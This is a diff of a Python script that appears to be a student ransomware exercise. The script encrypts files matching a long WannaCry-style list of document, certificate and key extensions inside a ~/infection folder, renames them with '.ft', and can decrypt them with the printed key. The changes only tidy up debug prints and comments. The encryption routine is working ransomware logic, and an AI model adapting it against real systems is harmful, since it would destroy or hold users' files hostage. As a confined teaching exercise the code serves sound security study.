@@ -6,17 +6,12 @@ from cryptography.fernet import Fernet
 import os
 import glob
 
-# generate key
 def generate_key():
     return Fernet.generate_key()
 
-##################  Encrypt and Decrypt file  ########################
 def encrypt_file(key, file_path, silent):
     with open(file_path, 'rb') as file: # 'rb' read binary
         data = file.read()
-
-    # print(f"la data -->{data}")
-
     fernet = Fernet(key)
     encryption_data = fernet.encrypt(data)
 
@@ -29,17 +24,15 @@ def encrypt_file(key, file_path, silent):
 def decrypt_file(file_path, key, silent):
     with open(file_path, 'rb') as file:
         data = file.read()
-    print("aaaaaaaaaaaaaaaaaaaaaaaaaaaa")
+
     fernet = Fernet(key)
-    print("aaaaaaaaaaaaaaaaaaaaaaaaaaaa")
     decrypted_data = fernet.decrypt(data)
+
     with open(file_path, 'wb') as file:
         file.write(decrypted_data)
     if not silent:
         print(f"Decrypted: {file_path}")
-#########################################################################
 
-###############################  Name file  #############################
 def rename_file(file_path, silent):
     new_file_path = file_path + ".ft"
     if not file_path.endswith('.ft'):
@@ -54,8 +47,6 @@ def reverse_rename_file(file_path, silent):
         if not silent:
             print(f"Renamed: {file_path} to {original_file_path}")
 
-#########################################################################
-
 
 if __name__ == '__main__':
     parser = argparse.ArgumentParser(
@@ -68,25 +59,17 @@ if __name__ == '__main__':
     parser.add_argument('-s', '--silent', action='store_true', help='Suppress output during the process')
 
     args = parser.parse_args()
-    # print(args)
-    # print(args.reverse)
 
     try:
         if args.version:
             print("Version 1.0.0")
-            sys.exit(1)
+            sys.exit(0)
 
         home_dir = os.path.expanduser("~")
         verif_infection_dir = os.path.join(home_dir, "infection")
         if not os.path.exists(verif_infection_dir):
             print(f"The directory {verif_infection_dir} does not exist.")
             sys.exit(1)
-
-        # print(home_dir)
-        # test = generate_key()
-        # print("\n")
-        # print(test)
-        # print("\n")
 
         extensions = [
             '.der', '.pfx', '.key', '.crt', '.csr', '.p12', '.pem', '.odt', '.ott', '.sxw', '.stw', '.uot', 
@@ -105,41 +88,37 @@ if __name__ == '__main__':
             '.ppsm', '.pps', '.pot', '.pptm', '.pptx', '.ppt', '.xltm', '.xltx', '.xlc', '.xlm', '.xlt', 
             '.xlw', '.xlsb', '.xlsm', '.xlsx', '.xls', '.dotx', '.dotm', '.dot', '.docm', '.docb', '.docx', 
         ]
-        # files_to_process = [
-        #     file  # Include each file found in the final list
-        #     for ext in extensions  # Iterate over each extension in the wannacry_extensions list
-        #     for file in glob.glob(os.path.join(verif_infection_dir, f'*{ext}'))  # For each extension, find all matching files in the infection_dir
-        # ]
-        files_to_process = []
-        for ext in extensions:
-            pattern = os.path.join(verif_infection_dir, f'*{ext}')
-            matching_files = glob.glob(pattern) # return all file that content extension
-            for file in matching_files:
-                files_to_process.append(file)
+        files_to_process = [
+            file  # Include each file found in the final list
+            for ext in extensions  # Iterate over each extension in the wannacry_extensions list
+            for file in glob.glob(os.path.join(verif_infection_dir, f'*{ext}'))  # For each extension, find all matching files in the infection_dir
+        ]
+        # files_to_process = []
+        # for ext in extensions:
+        #     pattern = os.path.join(verif_infection_dir, f'*{ext}')
+        #     matching_files = glob.glob(pattern) # return all file that content extension
+        #     for file in matching_files:
+        #         files_to_process.append(file)
 
         if args.reverse:
-            # key = load_key(args.reverse)
             key = args.reverse
-            # ft_files_to_process = [
-            #     file for file in glob.glob(os.path.join(verif_infection_dir, '*.ft'))
-            # ]
-            ft_files_to_process = []
-            pattern = os.path.join(verif_infection_dir, '*.ft')
-            matching_files = glob.glob(pattern)
-            for file in matching_files:
-                ft_files_to_process.append(file)
+            ft_files_to_process = [
+                file for file in glob.glob(os.path.join(verif_infection_dir, '*.ft'))
+            ]
+            # ft_files_to_process = []
+            # pattern = os.path.join(verif_infection_dir, '*.ft')
+            # matching_files = glob.glob(pattern)
+            # for file in matching_files:
+            #     ft_files_to_process.append(file)
 
             for file_path in ft_files_to_process:
-                print("dwwwwwwwwwwwwwwwww")
                 decrypt_file(file_path, key, args.silent)
                 reverse_rename_file(file_path, args.silent)
 
         else:
             key = generate_key()
-            # print(f"key: {key}")
             print(f"Encryption key: {key.decode()}")
             for file_path in files_to_process:
-                print("aaaaaaaaaaaaaaaaaaa")
                 encrypt_file(key, file_path, args.silent)
                 rename_file(file_path, args.silent)
 
